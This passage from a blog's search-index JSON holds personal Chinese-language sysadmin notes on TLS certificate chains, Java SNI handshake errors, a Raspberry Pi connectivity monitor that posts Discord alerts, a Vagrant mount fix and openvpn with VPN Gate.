","date":"2020-07-14","objectID":"/blog/posts/%E8%A8%AD%E5%82%99%E6%A0%B9%E6%86%91%E8%AD%89%E4%B8%8D%E6%AD%A3%E7%A2%BA%E5%B0%8E%E8%87%B4%E4%B8%8D%E8%83%BD%E6%89%93API%E5%95%8F%E9%A1%8C/:2:3","tags":["tls","憑證"],"title":"設備根憑證不正確導致不能打API問題","uri":"/blog/posts/%E8%A8%AD%E5%82%99%E6%A0%B9%E6%86%91%E8%AD%89%E4%B8%8D%E6%AD%A3%E7%A2%BA%E5%B0%8E%E8%87%B4%E4%B8%8D%E8%83%BD%E6%89%93API%E5%95%8F%E9%A1%8C/"},{"categories":["Linux"],"content":"整理憑證鍊遇到問題 Contains anchors 包到主憑證，之前有看過文章中繼憑證不需要包 root ca Chain issues: Contains anchors Trouble with intermediate certificate “Chain Issues: Incomplete” Extra download 好像就是中繼憑證跟給予憑證沒包在一起樣子? 我沒有實驗，像 nginx 就沒有中繼憑證設定 不是很確定原因 How to fix “Extra download” Multiple Certification Paths https://www.ssl.com.tw/Down/ ","date":"2020-07-14","objectID":"/blog/posts/%E8%A8%AD%E5%82%99%E6%A0%B9%E6%86%91%E8%AD%89%E4%B8%8D%E6%AD%A3%E7%A2%BA%E5%B0%8E%E8%87%B4%E4%B8%8D%E8%83%BD%E6%89%93API%E5%95%8F%E9%A1%8C/:2:4","tags":["tls","憑證"],"title":"設備根憑證不正確導致不能打API問題","uri":"/blog/posts/%E8%A8%AD%E5%82%99%E6%A0%B9%E6%86%91%E8%AD%89%E4%B8%8D%E6%AD%A3%E7%A2%BA%E5%B0%8E%E8%87%B4%E4%B8%8D%E8%83%BD%E6%89%93API%E5%95%8F%E9%A1%8C/"},{"categories":["Linux"],"content":"下載憑證方法(無法看到中繼憑證) Get SSL Certificate from Server (Site URL) - Export \u0026 Download - ShellHacks # 下載憑證 (不包含中繼) echo | openssl s_client -servername NAME -connect HOST:PORT |\\ sed -ne '/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-/p' \u003e certificate.crt # 查看中繼憑證 (-A 數字可以大一點) echo \"\"|openssl s_client -connect www.cgh.org.tw:443 2\u003e\u00261 | grep -A 9 \"Certificate chain\" 其實之前就有做過類似筆記:Linux 指令確認SSL憑證 | 程式狂想筆記 ","date":"2020-07-14","objectID":"/blog/posts/%E8%A8%AD%E5%82%99%E6%A0%B9%E6%86%91%E8%AD%89%E4%B8%8D%E6%AD%A3%E7%A2%BA%E5%B0%8E%E8%87%B4%E4%B8%8D%E8%83%BD%E6%89%93API%E5%95%8F%E9%A1%8C/:2:5","tags":["tls","憑證"],"title":"設備根憑證不正確導致不能打API問題","uri":"/blog/posts/%E8%A8%AD%E5%82%99%E6%A0%B9%E6%86%91%E8%AD%89%E4%B8%8D%E6%AD%A3%E7%A2%BA%E5%B0%8E%E8%87%B4%E4%B8%8D%E8%83%BD%E6%89%93API%E5%95%8F%E9%A1%8C/"},{"categories":["Linux"],"content":"格式轉換 openssl 指令 command line - 轉檔 pem/der/p7b/pfx/cer | SSORC.tw ","date":"2020-07-14","objectID":"/blog/posts/%E8%A8%AD%E5%82%99%E6%A0%B9%E6%86%91%E8%AD%89%E4%B8%8D%E6%AD%A3%E7%A2%BA%E5%B0%8E%E8%87%B4%E4%B8%8D%E8%83%BD%E6%89%93API%E5%95%8F%E9%A1%8C/:2:6","tags":["tls","憑證"],"title":"設備根憑證不正確導致不能打API問題","uri":"/blog/posts/%E8%A8%AD%E5%82%99%E6%A0%B9%E6%86%91%E8%AD%89%E4%B8%8D%E6%AD%A3%E7%A2%BA%E5%B0%8E%E8%87%B4%E4%B8%8D%E8%83%BD%E6%89%93API%E5%95%8F%E9%A1%8C/"},{"categories":["Linux"],"content":"其他 安裝中繼憑證 Yy’s Program: GCA政府憑證串鍊(Certificate chain)問題 see chain ssl - show entire certificate chain for a local certificate file - Stack Overflow Show the certificate chain of a local X509 file - kdecherf ~ % 這邊是做憑證驗證 憑證教學 SSL 憑證申請、取得及安裝 @ 來吧~~~電腦 :: 隨意窩 Xuite日誌 Apache Nginx上安裝 TWCA憑證 - Alvin Chen Club Mozilla SSL Configuration Generator 之後相關 Apache, Redis, Mysql TLS 加密可以看這邊設定 ","date":"2020-07-14","objectID":"/blog/posts/%E8%A8%AD%E5%82%99%E6%A0%B9%E6%86%91%E8%AD%89%E4%B8%8D%E6%AD%A3%E7%A2%BA%E5%B0%8E%E8%87%B4%E4%B8%8D%E8%83%BD%E6%89%93API%E5%95%8F%E9%A1%8C/:2:7","tags":["tls","憑證"],"title":"設備根憑證不正確導致不能打API問題","uri":"/blog/posts/%E8%A8%AD%E5%82%99%E6%A0%B9%E6%86%91%E8%AD%89%E4%B8%8D%E6%AD%A3%E7%A2%BA%E5%B0%8E%E8%87%B4%E4%B8%8D%E8%83%BD%E6%89%93API%E5%95%8F%E9%A1%8C/"},{"categories":["Linux"],"content":"小記 原本這個問題沒有頭緒，line webhook 後臺可以打得到AP 但是用手機 LINE APP 操作就抓不到 有用防火牆看到 Server Action RST 正常Action:Session close 後來用公司 Load Balancer 作風包解析(tcpdump) 發現這一塊 https 三項交握有問題 看了這篇除了驗證憑證，那註銷後的憑證要怎麼確認 Google 一下找到 CRL(寫程式是良心事業: OCSP \u0026 CRL 介紹) 這邊就不先繼續研究了 我覺得之後可以手動做做看 TODO: 之後可能照保哥做做看自簽名憑證 產生自簽憑證筆記 | 程式狂想筆記 完成測試 這篇算是我的筆記，也許會有很多寫錯，建議大家還是看看大神寫文章!! 購買與安裝 SSL 憑證完全攻略（以 IIS7 為例） | The Will Will Web 如何使用 OpenSSL 建立開發測試用途的自簽憑證 (Self-Signed Certificate) | The Will Will Web 免費申請 StartSSL™ 個人數位簽章與網站 SSL 憑證完全攻略 | The Will Will Web ","date":"2020-07-14","objectID":"/blog/posts/%E8%A8%AD%E5%82%99%E6%A0%B9%E6%86%91%E8%AD%89%E4%B8%8D%E6%AD%A3%E7%A2%BA%E5%B0%8E%E8%87%B4%E4%B8%8D%E8%83%BD%E6%89%93API%E5%95%8F%E9%A1%8C/:3:0","tags":["tls","憑證"],"title":"設備根憑證不正確導致不能打API問題","uri":"/blog/posts/%E8%A8%AD%E5%82%99%E6%A0%B9%E6%86%91%E8%AD%89%E4%B8%8D%E6%AD%A3%E7%A2%BA%E5%B0%8E%E8%87%B4%E4%B8%8D%E8%83%BD%E6%89%93API%E5%95%8F%E9%A1%8C/"},{"categories":["Linux"],"content":"最近 Raspberry Pi 三號機網路常常掛點 雖然之前有找到讓它重新開機的方法 Linux在Wifi使用pppoe連線後，重開機不能連線上網 | 程式狂想筆記 但我沒採用這個方案 畢竟有時候需要確保有哪些程式正在執行 再重開機是比較好的 ","date":"2020-06-27","objectID":"/blog/posts/%E7%9B%A3%E6%8E%A7%E9%9B%BB%E8%85%A6%E6%B4%BB%E8%91%97%E7%99%BC%E9%80%81-DISCORD-%E9%80%9A%E7%9F%A5/:0:0","tags":["discord","raspberry"],"title":"監控電腦活著發送 DISCORD 通知","uri":"/blog/posts/%E7%9B%A3%E6%8E%A7%E9%9B%BB%E8%85%A6%E6%B4%BB%E8%91%97%E7%99%BC%E9%80%81-DISCORD-%E9%80%9A%E7%9F%A5/"},{"categories":["Linux"],"content":"有問題電腦解決重新連線方法 最近看到Headless raspberryPi with eth0+USB issue Register 0x00000114 - Raspberry Pi Forums 這邊會 ping 自己的路由 失敗會重啟 Interface #!/bin/sh # cron script for checking wlan connectivity IP_FOR_TEST=\"192.168.1.1\" PING_COUNT=1 PING=\"/bin/ping\" IFUP=\"/sbin/ifup\" IFDOWN=\"/sbin/ifdown --force\" INTERFACE=\"eth0\" FFLAG=\"/opt/check_lan/stuck.fflg\" # ping test $PING -c $PING_COUNT $IP_FOR_TEST \u003e /dev/null 2\u003e /dev/null if [ $? -ge 1 ] then logger \"$INTERFACE seems to be down, trying to bring it up...\" if [ -e $FFLAG ] then logger \"$INTERFACE is still down, REBOOT to recover ...\" rm -f $FFLAG 2\u003e/dev/null sudo reboot else touch $FFLAG logger $(sudo $IFDOWN $INTERFACE) sleep 10 logger $(sudo $IFUP $INTERFACE) fi else # logger \"$INTERFACE is up\" rm -f $FFLAG 2\u003e/dev/null fi 但我不想重開機 之後找時間改寫 ","date":"2020-06-27","objectID":"/blog/posts/%E7%9B%A3%E6%8E%A7%E9%9B%BB%E8%85%A6%E6%B4%BB%E8%91%97%E7%99%BC%E9%80%81-DISCORD-%E9%80%9A%E7%9F%A5/:1:0","tags":["discord","raspberry"],"title":"監控電腦活著發送 DISCORD 通知","uri":"/blog/posts/%E7%9B%A3%E6%8E%A7%E9%9B%BB%E8%85%A6%E6%B4%BB%E8%91%97%E7%99%BC%E9%80%81-DISCORD-%E9%80%9A%E7%9F%A5/"},{"categories":["Linux"],"content":"改成監控紀錄 log #!/bin/sh # cron script for checking wlan connectivity IP_FOR_TEST=\"192.168.1.1\" PING_COUNT=1 PING=\"/bin/ping\" INTERFACE=\"eth0\" # ping test $PING -c $PING_COUNT $IP_FOR_TEST \u003e /dev/null 2\u003e /dev/null if [ $? -ge 1 ] then logger -it check_interface \"=============================\" logger -it check_interface \"$INTERFACE seems to be down, trying to bring it up...\" logger -it check_interface \"carrier:\" cat /sys/class/net/eth0/carrier | logger -it check_interface logger -it check_interface \"operstate:\" cat /sys/class/net/eth0/operstate | logger -it check_interface logger -it check_interface \"route -n\" route -n 2\u003e\u00261 | logger -it check_interface logger -it check_interface \"ifconfig:\" ifconfig 2\u003e\u00261 | logger -it check_interface logger -it check_interface \"ping:\" ping -c4 192.168.1.1 | logger -it check_interface ping -c4 8.8.8.8 | logger -it check_interface logger -it check_interface \"=============================\" fi 紀錄 log linux日志logger命令详解_飘过的春风-CSDN博客_linux logger Linux 如何將資料寫到 Syslog | Tsung’s Blog shell - Linux : how to redirect stdout \u0026 stderr to logger? - Unix \u0026 Linux Stack Exchange 相關 interface 資訊 如何在 Linux Kernel 下偵測網路的連線狀態？ wifi连接中operstate和carrier分别是什么作用？-CSDN论坛 在Linux上，如何檢測物理電纜是否已連接到網卡插槽 - Ubuntu問答 树莓派折腾日记 二：网络相关配置 | 冰棒实验室 ","date":"2020-06-27","objectID":"/blog/posts/%E7%9B%A3%E6%8E%A7%E9%9B%BB%E8%85%A6%E6%B4%BB%E8%91%97%E7%99%BC%E9%80%81-DISCORD-%E9%80%9A%E7%9F%A5/:1:1","tags":["discord","raspberry"],"title":"監控電腦活著發送 DISCORD 通知","uri":"/blog/posts/%E7%9B%A3%E6%8E%A7%E9%9B%BB%E8%85%A6%E6%B4%BB%E8%91%97%E7%99%BC%E9%80%81-DISCORD-%E9%80%9A%E7%9F%A5/"},{"categories":["Linux"],"content":"監控電腦活著發送 DISCORD 通知 其他機都非常穩定 別台監控狀態 #!/bin/bash PING=\"/bin/ping\" PING_COUNT=1 IP=( 192.168.1.1 192.168.1.2 192.168.1.3 ) DSCORD_WEBHOOK=\"https://discordapp.com/api/webhooks/*\" function sendDiscordNotice(){ local MSG=$2 # echo $MSG local URL=$1 curl -H \"Content-Type: application/json\" \\ -X POST \\ -d \"{\\\"username\\\": \\\"system\\\", \\\"content\\\": \\\"${MSG}\\\"}\" $URL } #sendDiscordNotice $DSCORD_WEBHOOK \"test\" for i in \"${IP[@]}\" do #echo $i MSG=\"${i} 沒法 PING 到主機，請管理員查詢狀況\" #echo $MSG $PING -c $PING_COUNT $i \u003e /dev/null 2\u003e /dev/null if [ $? -ge 1 ]; then sendDiscordNotice \"${DSCORD_WEBHOOK}\" \"${MSG}\" fi done 這邊學到shell function 參數是用 $1 $2 參數最後外面加個\"預防參考帶進去有問題 Bash 程式設計教學與範例：function 自訂函數 - Office 指南 對 variable 使用 foeach Loop through an array of strings in Bash? - Stack Overflow ","date":"2020-06-27","objectID":"/blog/posts/%E7%9B%A3%E6%8E%A7%E9%9B%BB%E8%85%A6%E6%B4%BB%E8%91%97%E7%99%BC%E9%80%81-DISCORD-%E9%80%9A%E7%9F%A5/:2:0","tags":["discord","raspberry"],"title":"監控電腦活著發送 DISCORD 通知","uri":"/blog/posts/%E7%9B%A3%E6%8E%A7%E9%9B%BB%E8%85%A6%E6%B4%BB%E8%91%97%E7%99%BC%E9%80%81-DISCORD-%E9%80%9A%E7%9F%A5/"},{"categories":["Linux"],"content":"番外 ","date":"2020-06-27","objectID":"/blog/posts/%E7%9B%A3%E6%8E%A7%E9%9B%BB%E8%85%A6%E6%B4%BB%E8%91%97%E7%99%BC%E9%80%81-DISCORD-%E9%80%9A%E7%9F%A5/:3:0","tags":["discord","raspberry"],"title":"監控電腦活著發送 DISCORD 通知","uri":"/blog/posts/%E7%9B%A3%E6%8E%A7%E9%9B%BB%E8%85%A6%E6%B4%BB%E8%91%97%E7%99%BC%E9%80%81-DISCORD-%E9%80%9A%E7%9F%A5/"},{"categories":["Linux"],"content":"開機做發信動作 ubuntu server 開機自動發信通知(使用gmail) | pupuliao的部落格 決得這邊沒有考慮到網路的問題 但這個方法也滿有用的 先記錄 ","date":"2020-06-27","objectID":"/blog/posts/%E7%9B%A3%E6%8E%A7%E9%9B%BB%E8%85%A6%E6%B4%BB%E8%91%97%E7%99%BC%E9%80%81-DISCORD-%E9%80%9A%E7%9F%A5/:3:1","tags":["discord","raspberry"],"title":"監控電腦活著發送 DISCORD 通知","uri":"/blog/posts/%E7%9B%A3%E6%8E%A7%E9%9B%BB%E8%85%A6%E6%B4%BB%E8%91%97%E7%99%BC%E9%80%81-DISCORD-%E9%80%9A%E7%9F%A5/"},{"categories":["Linux"],"content":"看到另類 ping 大法 剛好爬到不錯文章，想到之前有類似做這個，可以留著以後參考 为 ping 添加时间戳后台运行实时输出保存日志 | HelloDog 備份圖 为ping添加时间戳后台运行实时输出保存日志 - 知乎備份圖 ","date":"2020-06-27","objectID":"/blog/posts/%E7%9B%A3%E6%8E%A7%E9%9B%BB%E8%85%A6%E6%B4%BB%E8%91%97%E7%99%BC%E9%80%81-DISCORD-%E9%80%9A%E7%9F%A5/:4:0","tags":["discord","raspberry"],"title":"監控電腦活著發送 DISCORD 通知","uri":"/blog/posts/%E7%9B%A3%E6%8E%A7%E9%9B%BB%E8%85%A6%E6%B4%BB%E8%91%97%E7%99%BC%E9%80%81-DISCORD-%E9%80%9A%E7%9F%A5/"},{"categories":["Vagrant"],"content":"最近發現 Ubuntu 某一版就不能做自動掛載 會出現 Vagrant was unable to mount VirtualBox shared folders. This is usually because the filesystem \"vboxsf\" is not available. This filesystem is made available via the VirtualBox Guest Additions and kernel module. Please verify that these guest additions are properly installed in the guest. This is not a bug in Vagrant and is usually caused by a faulty Vagrant box. For context, the command attempted was: mount -t vboxsf -o uid=1000,gid=1000 vagrant /vagrant The error output from the command was: /sbin/mount.vboxsf: mounting failed with the error: No such device 其實只要安裝 vagrant plugin install vagrant-vbguest 就解決了 ","date":"2020-06-26","objectID":"/blog/posts/vagrant-%E5%95%9F%E5%8B%95%E7%84%A1%E6%B3%95%E8%87%AA%E5%8B%95%E6%8E%9B%E8%BC%89%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95/:0:0","tags":["vagrant","virtualbox"],"title":"vagrant 啟動無法自動掛載解決方法","uri":"/blog/posts/vagrant-%E5%95%9F%E5%8B%95%E7%84%A1%E6%B3%95%E8%87%AA%E5%8B%95%E6%8E%9B%E8%BC%89%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95/"},{"categories":null,"content":"最近在做 line webhook 但是做測試的時候 發現沒有呼叫我的程式 但我手機、其他電腦都可以連線 這又非常詭異 ","date":"2020-06-25","objectID":"/blog/posts/Java-%E5%9B%A0%E6%86%91%E8%AD%89-SNI-%E5%95%8F%E9%A1%8C%E9%A9%97%E8%AD%89%E4%B8%8D%E9%81%8E/:0:0","tags":null,"title":"Java 因憑證 SNI 問題驗證不過","uri":"/blog/posts/Java-%E5%9B%A0%E6%86%91%E8%AD%89-SNI-%E5%95%8F%E9%A1%8C%E9%A9%97%E8%AD%89%E4%B8%8D%E9%81%8E/"},{"categories":null,"content":"使用外部網站檢查 我在SSL Server Test (Powered by Qualys SSL Labs)做測試 是在這裡面找到的edelahozuah/awesome-tls-security: A collection of (not-so, yet) awesome resources related to TLS, PKI and related stuff 這個網站可以找到很多問題 但主要不能連我是遇到的問題是Client aborts on SNI unrecognized_name warning ![憑證問題\"](./error1.png “Java SNI) ","date":"2020-06-25","objectID":"/blog/posts/Java-%E5%9B%A0%E6%86%91%E8%AD%89-SNI-%E5%95%8F%E9%A1%8C%E9%A9%97%E8%AD%89%E4%B8%8D%E9%81%8E/:1:0","tags":null,"title":"Java 因憑證 SNI 問題驗證不過","uri":"/blog/posts/Java-%E5%9B%A0%E6%86%91%E8%AD%89-SNI-%E5%95%8F%E9%A1%8C%E9%A9%97%E8%AD%89%E4%B8%8D%E9%81%8E/"},{"categories":null,"content":"使用 Java SSLTEST 不多說，紀錄安裝過程 # 安裝 jdk sudo apt install default-jdk #openjdk-11-jdk # 下載 ssltest git clone https://github.com/ChristopherSchultz/ssltest.git cd ssltest ./build.sh # 記得 socure 跟 target 要改11 因為我使用的是11 cd build java -jar ssltest.jar google.com # 我第一次的實用適用 jdk 7 跑，會有 sni Exception # 但我現在用 jdk 11 沒有跑出 Exception # 不過可以看到沒有 Accepted java -jar ssltest.jar google.com.tw | grep Accepted 自己來寫一隻來驗證 其實用 postman 產生範例 搭配我之前 maven 執行 OkHttpClient client = new OkHttpClient(); Request request = new Request.Builder() .url(\"http://httpbin.org/get?test=123%20123\") .get() .addHeader(\"cache-control\", \"no-cache\") .addHeader(\"postman-token\", \"b0cbc43f-9a70-1056-951e-e5b0c6b2dd33\") .build(); Response response = client.newCall(request).execute(); maven 不知道為什麼執行要加這段 -Dexec.cleanupDaemonThreads=false 运行 mvn java:exec 如何避免 IllegalThreadStateException - 尚码园 [WARNING] javax.net.ssl.SSLHandshakeException: received handshake warning: unrecognized_name at sun.security.ssl.Alert.createSSLException (Alert.java:131) at sun.security.ssl.Alert.createSSLException (Alert.java:117) at sun.security.ssl.TransportContext.fatal (TransportContext.java:313) at sun.security.ssl.TransportContext.fatal (TransportContext.java:269) at sun.security.ssl.TransportContext.fatal (TransportContext.java:260) at sun.security.ssl.Alert$AlertConsumer.consume (Alert.java:272) at sun.security.ssl.TransportContext.dispatch (TransportContext.java:186) at sun.security.ssl.SSLTransport.decode (SSLTransport.java:164) at sun.security.ssl.SSLSocketImpl.decode (SSLSocketImpl.java:1144) at sun.security.ssl.SSLSocketImpl.readHandshakeRecord (SSLSocketImpl.java:1055) at sun.security.ssl.SSLSocketImpl.startHandshake (SSLSocketImpl.java:395) at okhttp3.internal.connection.RealConnection.connectTls (RealConnection.kt:367) at okhttp3.internal.connection.RealConnection.establishProtocol (RealConnection.kt:325) at okhttp3.internal.connection.RealConnection.connect (RealConnection.kt:197) at okhttp3.internal.connection.ExchangeFinder.findConnection (ExchangeFinder.kt:249) at okhttp3.internal.connection.ExchangeFinder.findHealthyConnection (ExchangeFinder.kt:108) at okhttp3.internal.connection.ExchangeFinder.find (ExchangeFinder.kt:76) at okhttp3.internal.connection.RealCall.initExchange$okhttp (RealCall.kt:245) at okhttp3.internal.connection.ConnectInterceptor.intercept (ConnectInterceptor.kt:32) at okhttp3.internal.http.RealInterceptorChain.proceed (RealInterceptorChain.kt:100) at okhttp3.internal.cache.CacheInterceptor.intercept (CacheInterceptor.kt:96) at okhttp3.internal.http.RealInterceptorChain.proceed (RealInterceptorChain.kt:100) at okhttp3.internal.http.BridgeInterceptor.intercept (BridgeInterceptor.kt:83) at okhttp3.internal.http.RealInterceptorChain.proceed (RealInterceptorChain.kt:100) at okhttp3.internal.http.RetryAndFollowUpInterceptor.intercept (RetryAndFollowUpInterceptor.kt:76) at okhttp3.internal.http.RealInterceptorChain.proceed (RealInterceptorChain.kt:100) at okhttp3.internal.connection.RealCall.getResponseWithInterceptorChain$okhttp (RealCall.kt:197) at okhttp3.internal.connection.RealCall.execute (RealCall.kt:148) at test.App.main (App.java:23) at org.codehaus.mojo.exec.ExecJavaMojo$1.run (ExecJavaMojo.java:254) at java.lang.Thread.run (Thread.java:834) 正在就能證明 JAVA 程式會有問題 ","date":"2020-06-25","objectID":"/blog/posts/Java-%E5%9B%A0%E6%86%91%E8%AD%89-SNI-%E5%95%8F%E9%A1%8C%E9%A9%97%E8%AD%89%E4%B8%8D%E9%81%8E/:2:0","tags":null,"title":"Java 因憑證 SNI 問題驗證不過","uri":"/blog/posts/Java-%E5%9B%A0%E6%86%91%E8%AD%89-SNI-%E5%95%8F%E9%A1%8C%E9%A9%97%E8%AD%89%E4%B8%8D%E9%81%8E/"},{"categories":null,"content":"Java 其他驗證 這個也可以直接看到 Exception 錯誤內容 UniconLabs/java-keystore-ssl-test: A simple script to verify SSL/HTTPS functionality of a remote host through JDK keystore. mvn clean package cd target java -jar java-keystore-test-0.1.0.jar https://google.com.tw ","date":"2020-06-25","objectID":"/blog/posts/Java-%E5%9B%A0%E6%86%91%E8%AD%89-SNI-%E5%95%8F%E9%A1%8C%E9%A9%97%E8%AD%89%E4%B8%8D%E9%81%8E/:3:0","tags":null,"title":"Java 因憑證 SNI 問題驗證不過","uri":"/blog/posts/Java-%E5%9B%A0%E6%86%91%E8%AD%89-SNI-%E5%95%8F%E9%A1%8C%E9%A9%97%E8%AD%89%E4%B8%8D%E9%81%8E/"},{"categories":null,"content":"其他程式 curl https://xxx golang 就用 postman 產生出來吧 ","date":"2020-06-25","objectID":"/blog/posts/Java-%E5%9B%A0%E6%86%91%E8%AD%89-SNI-%E5%95%8F%E9%A1%8C%E9%A9%97%E8%AD%89%E4%B8%8D%E9%81%8E/:4:0","tags":null,"title":"Java 因憑證 SNI 問題驗證不過","uri":"/blog/posts/Java-%E5%9B%A0%E6%86%91%E8%AD%89-SNI-%E5%95%8F%E9%A1%8C%E9%A9%97%E8%AD%89%E4%B8%8D%E9%81%8E/"},{"categories":null,"content":"解決方法 apache VirtualServer 設定 ServerName xxx \u003cVirtualHost xxx:443\u003e ServerName www.example.com ServerAlias example.com www.example.com ... Client aborts on SNI unrecognized_name warning Qualys Labs SSL Test - Incorrect SNI alerts - JERVIS DOT WS 其他相關 java - Handshake alert: Unrecognized_name Liberty Profile - Stack Overflow 10 Online Tool to Test SSL, TLS and Latest Vulnerability - Geekflare drwetter/testssl.sh: Testing TLS/SSL encryption anywhere on any port git clone https://github.com/drwetter/testssl.sh chmod a+x testssh.sh ./testssh.sh google.com pornin/TestSSLServer tord and lion’s lair | 各式心得 | 頁 4 ","date":"2020-06-25","objectID":"/blog/posts/Java-%E5%9B%A0%E6%86%91%E8%AD%89-SNI-%E5%95%8F%E9%A1%8C%E9%A9%97%E8%AD%89%E4%B8%8D%E9%81%8E/:5:0","tags":null,"title":"Java 因憑證 SNI 問題驗證不過","uri":"/blog/posts/Java-%E5%9B%A0%E6%86%91%E8%AD%89-SNI-%E5%95%8F%E9%A1%8C%E9%A9%97%E8%AD%89%E4%B8%8D%E9%81%8E/"},{"categories":null,"content":"感想 之前萬用憑證(WildCard)和中間憑證小記 | 程式狂想筆記就讓我以為就不會有其他問題 沒想到 Java 也有憑證這一關(好像是 Java 獨立的) QQ 希望之後不要遇到類似這個問題 2020-07-28 ","date":"2020-06-25","objectID":"/blog/posts/Java-%E5%9B%A0%E6%86%91%E8%AD%89-SNI-%E5%95%8F%E9%A1%8C%E9%A9%97%E8%AD%89%E4%B8%8D%E9%81%8E/:6:0","tags":null,"title":"Java 因憑證 SNI 問題驗證不過","uri":"/blog/posts/Java-%E5%9B%A0%E6%86%91%E8%AD%89-SNI-%E5%95%8F%E9%A1%8C%E9%A9%97%E8%AD%89%E4%B8%8D%E9%81%8E/"},{"categories":null,"content":"Java SSLPoke 檢查 檢查也有找到這個方法可用[JAVA] SSL handshake連線測試工具 SSLPoke | 阿輝的零碎筆記 - 點部落 SSLPoke.java import java.io.PrintStream; import javax.net.ssl.SSLHandshakeException; import javax.net.ssl.SSLSocket; import javax.net.ssl.SSLSocketFactory; public class SSLPoke { public SSLPoke() {} public static void main(String[] paramArrayOfString) { if (paramArrayOfString.length != 2) { System.err.println(\"Utility to debug Java connections to SSL servers\"); System.err.println(\"Usage: \"); System.err.println(\" java \" + SSLPoke.class.getName() + \" \u003chost\u003e \u003cport\u003e\"); System.err.println(\"or for more debugging:\"); System.err.println(\" java -Djavax.net.debug=ssl \" + SSLPoke.class.getName() + \" \u003chost\u003e \u003cport\u003e\"); System.err.println(); System.err.println(\"Eg. to test the SSL certificate at https://localhost, use\"); System.err.println(\" java \" + SSLPoke.class.getName() + \" localhost 443\"); System.exit(1); } try { SSLSocketFactory localSSLSocketFactory = (SSLSocketFactory)SSLSocketFactory.getDefault(); SSLSocket localSSLSocket = (SSLSocket)localSSLSocketFactory.createSocket(paramArrayOfString[0], Integer.parseInt(paramArrayOfString[1])); java.io.InputStream localInputStream = localSSLSocket.getInputStream(); java.io.OutputStream localOutputStream = localSSLSocket.getOutputStream(); localOutputStream.write(1); while (localInputStream.available() \u003e 0) { System.out.print(localInputStream.read()); } System.out.println(\"Successfully connected\"); System.exit(0); } catch (SSLHandshakeException localSSLHandshakeException) { if (localSSLHandshakeException.getCause() != null) { localSSLHandshakeException.getCause().printStackTrace(); } else { localSSLHandshakeException.printStackTrace(); } } catch (Exception localException) { localException.printStackTrace(); } System.exit(1); } } ## 先打包成class $ javac SSLPoke.java $ java SSLPoke www.google.com 443 連線成功會顯示 $ java SSLPoke www.google.com 443 Successfully connected 失敗就會出現一大堆錯 ","date":"2020-06-25","objectID":"/blog/posts/Java-%E5%9B%A0%E6%86%91%E8%AD%89-SNI-%E5%95%8F%E9%A1%8C%E9%A9%97%E8%AD%89%E4%B8%8D%E9%81%8E/:7:0","tags":null,"title":"Java 因憑證 SNI 問題驗證不過","uri":"/blog/posts/Java-%E5%9B%A0%E6%86%91%E8%AD%89-SNI-%E5%95%8F%E9%A1%8C%E9%A9%97%E8%AD%89%E4%B8%8D%E9%81%8E/"},{"categories":null,"content":"handling exception: javax.net.ssl.SSLHandshakeException: sun.security.validator.ValidatorException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target handling exception: javax.net.ssl.SSLHandshakeException: sun.security.validator.ValidatorException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target sun.security.validator.ValidatorException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target 不知道是哪裡出問題 但後來發現是根憑證沒有這個 指定jks(加好根憑證)或自己加 java -Djavax.net.ssl.trustStore= # 吃公司內部jks 無可以設定 #java -Djavax.net.debug=ssl -Djavax.net.ssl.trustStore=./jssecacerts.jks SSLPoke xxxx.aaa.com.tw 443 获取访问目标主机的有效SSL/TLS证书 (无法直接得到证书时)_iihero@CSDN-CSDN博客 程式忽略掉 证书不安全解决HttpClient 如何忽略证书验证 - ALLOW_ALL_HOSTNAME_VERIFIER_tiantianchuqiji的博客-CSDN博客 ","date":"2020-06-25","objectID":"/blog/posts/Java-%E5%9B%A0%E6%86%91%E8%AD%89-SNI-%E5%95%8F%E9%A1%8C%E9%A9%97%E8%AD%89%E4%B8%8D%E9%81%8E/:7:1","tags":null,"title":"Java 因憑證 SNI 問題驗證不過","uri":"/blog/posts/Java-%E5%9B%A0%E6%86%91%E8%AD%89-SNI-%E5%95%8F%E9%A1%8C%E9%A9%97%E8%AD%89%E4%B8%8D%E9%81%8E/"},{"categories":["Linux"],"content":"最近要做測試國外網域的問題 VPN Gate: 公共 VPN 中继服务器列表 發現 VPN Gate 網站滿多 vpn 資訊 想使用 Linux 做操作 找了網路上資源 真的不是很多 這邊簡單做一下筆記 # 前面可以用 VM 開啟，我這邊是用 vagrant # 安裝 openvpn sudo apt install openvpn tmux # 下載 openv，可從 vpn gate 那邊下載 wget https://..../...ovpn 這邊下載檔名不能跟下載不一樣，建議還是用瀏覽器下載 # 開啟 tmux ，因為連接需要多開， tmux # 執行 openvpn openvpn ./xxxx.ovpn # 切回 command line Ctrl+b and d ifconfig # enp0s3: flags=4163\u003cUP,BROADCAST,RUNNING,MULTICAST\u003e mtu 1500 # inet 10.0.2.15 netmask 255.255.255.0 broadcast 10.0.2.255 # inet6 fe80::e8:2fff:fe1c:32d4 prefixlen 64 scopeid 0x20\u003clink\u003e # ether 02:e8:2f:1c:32:d4 txqueuelen 1000 (Ethernet) # RX packets 75995 bytes 94960003 (94.9 MB) # RX errors 0 dropped 0 overruns 0 frame 0 # TX packets 13566 bytes 1040385 (1.0 MB) # TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 # lo: flags=73\u003cUP,LOOPBACK,RUNNING\u003e mtu 65536 # inet 127.0.0.1 netmask 255.0.0.0 # inet6 ::1 prefixlen 128 scopeid 0x10\u003chost\u003e # loop txqueuelen 1000 (Local Loopback) # RX packets 36 bytes 3512 (3.5 KB) # RX errors 0 dropped 0 overruns 0 frame 0 # TX packets 36 bytes 3512 (3.5 KB) # TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 # tun0: flags=4305\u003cUP,POINTOPOINT,RUNNING,NOARP,MULTICAST\u003e mtu 1500 # inet 10.242.23.205 netmask 255.255.255.255 destination 10.242.23.206 # inet6 fe80::aad3:fe27:fda5:76d3 prefixlen 64 scopeid 0x20\u003clink\u003e # unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00 txqueuelen 100 (UNSPEC) # RX packets 2 bytes 1352 (1.3 KB) # RX errors 0 dropped 0 overruns 0 frame 0 # TX packets 3 bytes 128 (128.0 B) # TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 會多一個 interface( tun0 ) 這個部分就是有連接到 